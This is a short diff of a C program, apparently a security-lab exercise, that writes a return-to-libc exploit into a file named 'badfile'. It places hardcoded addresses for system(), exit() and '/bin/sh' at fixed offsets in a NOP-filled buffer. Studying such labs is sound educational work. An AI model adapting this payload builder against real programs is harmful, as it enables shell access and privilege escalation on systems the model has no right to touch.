@@ -26,9 +26,10 @@ void main(int argc, char **argv)
 	memset(&buffer, 0x90, 517);
 	/* You need to fill the buffer with appropriate contents here */
 	/* ... Put your code here ... */
-	*(long *) &buffer[44] = 0xb7ec582b;   //  "/bin/sh"
-	*(long *) &buffer[36] = 0xb7da4da0;   //  system()
-	*(long *) &buffer[40] = 0xb7d989d0;   //  exit()
+	long *tmp = (long *) buffer;
+	*(tmp + 11) = 0xb7ec582b;   //  "/bin/sh"
+	*(tmp + 9) = 0xb7da4da0;   //  system()
+	*(tmp + 10) = 0xb7d989d0;   //  exit()
 	
 	/* Save the contents to the file "badfile" */
 	badfile = fopen("./badfile", "w");
